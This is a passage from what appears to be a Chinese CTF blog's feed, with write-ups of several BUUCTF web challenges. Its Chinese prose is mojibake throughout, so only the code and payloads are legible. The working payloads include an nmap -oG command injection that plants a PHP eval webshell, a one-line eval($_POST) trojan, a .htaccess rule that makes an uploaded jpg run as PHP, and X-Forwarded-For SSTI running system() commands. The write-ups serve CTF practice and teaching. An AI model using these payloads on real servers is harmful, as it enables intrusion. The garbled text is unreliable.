alt="image-20210722092408748"></p><p>payload2ï¼š<code>?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));</code>è¿™ç§æ–¹æ³•ç”±äºé‡‡ç”¨äº†<code>array_rand</code>ï¼Œæ–‡ä»¶è¯»å–å…·æœ‰éšæœºæ€§ï¼Œå› æ­¤è¦å¤šè¯•å‡ æ¬¡å‡ºflag<img src="/2021/07/21/buuctf11/image-20210722092348283.png" alt="image-20210722092348283"></p><p>å‚è€ƒèµ„æ–™ï¼šæ— å‚æ•°RCEï¼š</p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE</a></p><p><a href="https://www.freesion.com/article/1919383150/">https://www.freesion.com/article/1919383150/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RoarCTF-2019-Easy-Java&quot;&gt;&lt;a href=&quot;#RoarCTF-2019-Easy-Java&quot; class=&quot;headerlink&quot; title=&quot;[RoarCTF 2019]Easy Java&quot;&gt;&lt;/a&gt;[RoarCTF 2019]Easy </summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf10</title>
    <link href="http://example.com/2021/07/20/buuctf10/"/>
    <id>http://example.com/2021/07/20/buuctf10/</id>
    <published>2021-07-20T00:35:40.000Z</published>
    <updated>2021-07-20T10:14:05.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¸€-é¢„å¤‡çŸ¥è¯†"><a href="#ä¸€-é¢„å¤‡çŸ¥è¯†" class="headerlink" title="ä¸€.é¢„å¤‡çŸ¥è¯†"></a>ä¸€.é¢„å¤‡çŸ¥è¯†</h4><ul><li><strong>escapeshellarg</strong> â€”â€”æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°</li></ul><p>åŠŸèƒ½ ï¼šescapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œ<br>è¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œshell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦(åå¼•å·)</p><ul><li><strong>escapeshellcmd</strong> â€”â€” shell å…ƒå­—ç¬¦è½¬ä¹‰</li></ul><p>åŠŸèƒ½ï¼šescapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚<br>æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚</p><p>åæ–œçº¿ï¼ˆ\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š&amp;#;|?~&lt;&gt;^()[]{}$*, \x0A å’Œ \xFFã€‚ <code>&#39;</code> å’Œ <code>&quot;</code>ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚<br>åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚</p><p><strong>ä¸¾ä¸ªä¾‹å­</strong></p><p>ä¼ å…¥å‚æ•°ï¼š<code>127.0.0.1&#39; -d a=1</code></p><p>ç»è¿‡escapeshellarg()å‡½æ•°å¤„ç†åå˜æˆï¼š<code>&#39;127.0.0.1&#39;\&#39;&#39; -d a=1&#39;</code></p><p>å†ç»è¿‡escapeshellcmd()å‡½æ•°å¤„ç†åå˜æˆï¼š<code>&#39;127.0.0.1&#39;\\&#39;&#39; -d a=1\&#39;</code></p><p>æ¯å¯¹å•å¼•å·é…å¯¹å½¢æˆè¿æ¥ç¬¦ï¼Œæœ€ç»ˆå¾—ç®€åŒ–ä¸ºï¼š<code>127.0.0.1\ -d a=1&#39;</code>ï¼Œå³å‘127.0.0.1\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1â€™ã€‚</p><ul><li>nmapå‘½ä»¤<code>-oG</code>ï¼šå°†ä¸€ä¸ªå‘½ä»¤å’Œç»“æœå†™å…¥åˆ°è‡ªå·±æŒ‡å®šçš„æ–‡ä»¶ä¸­</li></ul><h4 id="äºŒ-æ„é€ payload"><a href="#äºŒ-æ„é€ payload" class="headerlink" title="äºŒ.æ„é€ payload"></a>äºŒ.æ„é€ payload</h4><p><strong>ç¬¬ä¸€ç§ï¼š</strong>æ–‡ä»¶åå’Œå•å¼•å·ä¹‹é—´æœ‰ç©ºæ ¼</p><p>payloadï¼š<code>&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php &#39;</code></p><p>ç»è¿‡ä¸¤ä¸ªè¿‡æ»¤å‡½æ•°å¤„ç†åï¼š<code>&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[&quot;hack&quot;\]\)\;\?\&gt; -oG webshell.php &#39;\\&#39;&#39;</code></p><p>è¿™æ ·æˆ‘ä»¬åå°ç”Ÿæˆçš„æ–‡ä»¶åå°±æ˜¯<code>webshell.php</code></p><p><img src="/2021/07/20/buuctf10/image-20210720123151729.png"></p><p>ç®­å¤´æŒ‡å°±æ˜¯ä¸Šä¼ ç”Ÿæˆæ–‡ä»¶çš„æ–‡ä»¶å¤¹çš„åç§°ï¼Œç”¨èšå‰‘ç›´æ¥è¿æ¥æˆ‘ä»¬çš„æœ¨é©¬ã€‚</p><p><strong>ç¬¬äºŒç§ï¼š</strong>æ–‡ä»¶åå’Œå•å¼•å·ä¹‹é—´æ²¡æœ‰ç©ºæ ¼</p><p>payloadï¼š<code>&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php&#39;</code></p><p>ç»è¿‡ä¸¤ä¸ªè¿‡æ»¤å‡½æ•°å¤„ç†åï¼š<code>&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[&quot;hack&quot;\]\)\;\?\&gt; -oG webshell.php&#39;\\&#39;&#39;</code></p><p>è¿™æ ·åå°ç”Ÿæˆçš„æ–‡ä»¶åå°±æ˜¯<code>webshell.php\\</code>ï¼Œå°±ä¸èƒ½ç”¨èšå‰‘è¿æ¥äº†</p><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°æ˜¯ä¸€ä¸ªâ€å¾ˆå¹²å‡€â€œçš„ç½‘é¡µ</p><p><img src="/2021/07/20/buuctf10/image-20210720172626693.png" alt="image-20210720172626693"></p><h4 id="ä¸€-æ¢ç´¢"><a href="#ä¸€-æ¢ç´¢" class="headerlink" title="ä¸€.æ¢ç´¢"></a>ä¸€.æ¢ç´¢</h4><p><strong>ç‚¹å‡»Flag</strong>è¿›å…¥é¡µé¢ï¼š</p><p><img src="/2021/07/20/buuctf10/image-20210720172709618.png" alt="image-20210720172709618"></p><p>æ˜¯æˆ‘ä»¬çš„ipåœ°å€</p><p>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼Œçœ‹ä¸‹ä¸€ä¸ªç½‘é¡µ</p><p><strong>ç‚¹å‡»hintï¼š</strong></p><p><img src="/2021/07/20/buuctf10/image-20210720173148064.png" alt="image-20210720173148064"></p><p>æŸ¥çœ‹æºç ï¼š<img src="/2021/07/20/buuctf10/image-20210720173339461.png" alt="image-20210720173339461"></p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±æƒ³äº†ä»–æ€ä¹ˆçŸ¥é“æˆ‘ä»¬çš„ipçš„ï¼ŒXFFå—è¿˜æ˜¯client-ipï¼Œæˆ‘ä»¬å¯ä¸å¯ä»¥æ§åˆ¶ipçš„å€¼å‘¢ï¼Ÿ</p><h4 id="äºŒ-ç‰›åˆ€å°è¯•"><a href="#äºŒ-ç‰›åˆ€å°è¯•" class="headerlink" title="äºŒ.ç‰›åˆ€å°è¯•"></a>äºŒ.ç‰›åˆ€å°è¯•</h4><p>å¸¦ç€ä¸Šé¢çš„ç–‘æƒ‘ï¼ŒæŠ“åŒ…ï¼Œä½†æ˜¯æˆ‘å‘ç°åŸæœ¬å¹¶æ²¡æœ‰XFFæˆ–æ˜¯client-ipï¼Œé‚£æˆ‘ä»¬åŠ ä¸€ä¸ªXFF</p><p><img src="/2021/07/20/buuctf10/image-20210720173959441.png" alt="image-20210720173959441"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–æŠŠæˆ‘ä»¬çš„è¾“å…¥ç›´æ¥è¾“å‡ºåˆ°äº†ç½‘é¡µä¸Šã€‚è¿™é‡Œæˆ‘ä»¬è”æƒ³åˆ°SSTIä¸­ä¹Ÿæ˜¯æœåŠ¡ç«¯æŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹æ¸²æŸ“æˆæ¨¡æ¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨SSTIæ³¨å…¥<img src="/2021/07/20/buuctf10/image-20210720180432231.png" alt="image-20210720180432231"></p><p>å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨æ‰§è¡Œäº†æˆ‘ä»¬çš„é€»è¾‘è¿ç®—ï¼ŒSSTIçŸ³é”¤äº†</p><h4 id="ä¸‰-æ„é€ payload"><a href="#ä¸‰-æ„é€ payload" class="headerlink" title="ä¸‰.æ„é€ payload"></a>ä¸‰.æ„é€ payload</h4><p><strong>payloadï¼š</strong>X-Forwarded-For: {system(â€˜lsâ€™)}</p><p><img src="/2021/07/20/buuctf10/image-20210720181052132.png" alt="image-20210720181052132"></p><p><strong>payloadï¼š</strong>X-Forwarded-For: {system(â€˜cat flag.phpâ€™)}</p><p><img src="/2021/07/20/buuctf10/image-20210720181225764.png" alt="image-20210720181225764"></p><p>å‘ç°flagä¸åœ¨è¿™é‡Œé¢ï¼Œé‚£æŒ‰ç…§ç»éªŒæ¥è¯´ä¸€èˆ¬ä¼šæ”¾åœ¨æ ¹ç›®å½•</p><p><img src="/2021/07/20/buuctf10/image-20210720181328126.png" alt="image-20210720181328126"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUUCTF-2018-Online-Tool&quot;&gt;&lt;a href=&quot;#BUUCTF-2018-Online-Tool&quot; class=&quot;headerlink&quot; title=&quot;[BUUCTF 2018]Online Tool&quot;&gt;&lt;/a&gt;[BUUCTF 2018]Onl</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>buuctf9</title>
    <link href="http://example.com/2021/07/19/buuctf9/"/>
    <id>http://example.com/2021/07/19/buuctf9/</id>
    <published>2021-07-19T00:23:46.000Z</published>
    <updated>2021-07-19T13:42:35.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h1><p>æ‰“å¼€å®¹å™¨ï¼Œæ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜</p><h4 id="ä¸€-ç‰›åˆ€å°è¯•"><a href="#ä¸€-ç‰›åˆ€å°è¯•" class="headerlink" title="ä¸€.ç‰›åˆ€å°è¯•"></a>ä¸€.ç‰›åˆ€å°è¯•</h4><p>å…ˆä¸Šä¼ ä¸€ä¸ªæ™®é€šä¸€å¥è¯æœ¨é©¬webshell.jpgï¼š</p><p><code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>ï¼Œç„¶åæŠ“åŒ…ä¿®æ”¹åç¼€ä¸ºphpï¼Œå‘ç°ä¸Šä¼ å¤±è´¥<img src="/2021/07/19/buuctf9/image-20210719090306878.png" alt="image-20210719090306878"></p><p>ç„¶åæˆ‘å°è¯•äº†phtmlã€php3ç­‰éƒ½ä¸èƒ½ç»•è¿‡</p><p>è¯•ç€ç›´æ¥ä¸Šä¼ webshell.jpg<img src="/2021/07/19/buuctf9/image-20210719090532184.png" alt="image-20210719090532184"></p><p>çœ‹åˆ°å®ƒæœ‰å›æ˜¾ç»™æˆ‘ä»¬è·¯å¾„ï¼Œå°è¯•ä¸€ä¸‹ä¸Šä¼ .user.iniï¼Œä½†æ˜¯ç”±äºæ— æ³•ç¡®å®šä¸Šä¼ çš„æ–‡ä»¶å¤¹å†…æ˜¯å¦å·²ç»å­˜åœ¨phpåç¼€æ–‡ä»¶ï¼Œæˆ‘çŒœæµ‹å­˜åœ¨index.phpï¼Œä½†æ˜¯å¾ˆå¯æƒœå¤±è´¥äº†</p><h4 id="äºŒ-å¦è¾Ÿè¹Šå¾„"><a href="#äºŒ-å¦è¾Ÿè¹Šå¾„" class="headerlink" title="äºŒ.å¦è¾Ÿè¹Šå¾„"></a>äºŒ.å¦è¾Ÿè¹Šå¾„</h4><p>è¿™æ—¶å€™å°±è¦å¤ä¹ ä¸€ä¸ªé…ç½®æ–‡ä»¶**.htaccess**</p><p><strong>.htaccess</strong>å¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚</p><p>æˆ‘ä»¬è¿™é‡Œä¸Šä¼ ä¸€ä¸ª**.htaccess**å†…å®¹ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;webshell.jpg&quot;&gt;       &#x2F;&#x2F;è¿™é‡Œçš„æ–‡ä»¶åè¦å’Œä¸Šä¼ çš„ä¸€å¥è¯æœ¨é©¬çš„æ–‡ä»¶åä¸€æ ·            </span><br><span class="line"></span><br><span class="line">ã€€ã€€SetHandler application&#x2F;x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·Apacheä¼šå°†æˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶ï¼ˆwebshell.jpgï¼‰ä»¥phpæ ¼å¼è§£æ</p><p>è¿™è¾¹è¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯ï¼š</p><p>ä¸Šä¼ .htaccessçš„æ—¶å€™è¦æŠ“åŒ…ä¿®æ”¹ä¿®æ”¹æ–‡ä»¶ç±»å‹ï¼š<img src="/2021/07/19/buuctf9/image-20210719092714176.png" alt="image-20210719092714176"></p><p>æœ€åæˆ‘ä»¬ç”¨èšå‰‘è¿æ¥å°±å¥½äº†<img src="/2021/07/19/buuctf9/image-20210719091956225.png" alt="image-20210719091956225"></p><p><img src="/2021/07/19/buuctf9/image-20210719092031620.png" alt="image-20210719092031620"></p><h1 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h1><p>æ‰“å¼€å®¹å™¨ï¼Œå‘ç°ä¸€æ®µä»£ç </p><h4 id="ä¸€-ä»£ç åˆ†æ®µ"><a href="#ä¸€-ä»£ç åˆ†æ®µ" class="headerlink" title="ä¸€.ä»£ç åˆ†æ®µ"></a>ä¸€.ä»£ç åˆ†æ®µ</h4><p>æˆ‘æŠŠè¿™æ®µä»£ç å¤§è‡´åˆ†æˆä¸‰éƒ¨åˆ†ï¼š</p><p><strong>ç¬¬ä¸€éƒ¨åˆ†</strong>äº¤ä»£äº†è¯¥æ–‡ä»¶ä¸‹æ–‡ä»¶åŒ…å«äº†flag.phpæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><strong>ç¬¬äºŒéƒ¨åˆ†</strong>äº¤ä»£äº†FileHandlerç±»çš„å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰éƒ¨åˆ†äº¤ä»£ä¼ å‚çš„é™åˆ¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="äºŒ-ä»£ç å®¡è®¡"><a href="#äºŒ-ä»£ç å®¡è®¡" class="headerlink" title="äºŒ.ä»£ç å®¡è®¡"></a>äºŒ.ä»£ç å®¡è®¡</h4><p>é€šè¿‡getçš„æ–¹å¼è·å–ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œç„¶ååˆ¤æ–­å­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦çš„asciiç éƒ½åœ¨32åˆ°125ä¹‹é—´ï¼Œç¡®ä¿å˜é‡<code>str</code>çš„å€¼æ²¡æœ‰ä¸å¯æ‰“å°çš„å­—ç¬¦ä¸²åï¼Œå†æŠŠ<code>str</code>ååºåˆ—åŒ–ã€‚ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå…ˆæ‰§è¡Œè§£æå‡½æ•°<code>__destruct()</code>ï¼Œå¦‚æœ<code>op</code>å¼ºç­‰äº<strong>å­—ç¬¦ä¸²</strong>2ï¼Œé‚£ä¹ˆ<code>op</code>å°±ä¼šè¢«èµ‹å€¼ä¸º<strong>å­—ç¬¦ä¸²</strong>1ï¼Œæ¥ç€è°ƒç”¨process()å‡½æ•°ï¼Œå¦‚æœ<code>op</code>å¼±ç­‰äº1ï¼Œå°±è°ƒç”¨write()å‡½æ•°ï¼›å¦‚æœ<code>op</code>å¼±ç­‰äº2ï¼Œå°±è°ƒç”¨read()å‡½æ•°ã€‚å€¼çš„æ³¨æ„çš„æ˜¯read()å‡½æ•°ä¸­å­˜åœ¨<code>file_get_contents()</code>å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬è¦æƒ³åŠæ³•è°ƒç”¨åˆ°read()å‡½æ•°ã€‚</p><h4 id="ä¸‰-è§£é¢˜æ€è·¯"><a 